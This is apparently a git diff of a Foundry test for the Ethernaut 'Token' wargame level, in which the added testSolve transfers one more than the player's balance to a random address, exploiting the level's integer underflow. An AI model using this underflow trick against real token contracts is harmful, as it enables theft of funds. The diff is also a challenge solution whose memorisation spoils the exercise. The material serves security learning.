@@ -10,6 +10,7 @@ import {Ethernaut} from "src/Ethernaut.sol";
 
 interface Token {
     function transfer(address, uint256) external returns (bool);
+    function balanceOf(address _owner) external view returns (uint256 balance);
 }
 
 contract TestToken is Test, Utils {
@@ -61,6 +62,7 @@ contract TestToken is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
-
+        address to = vm.randomAddress();
+        instance.transfer(to, instance.balanceOf(player) + 1);
     }
 }
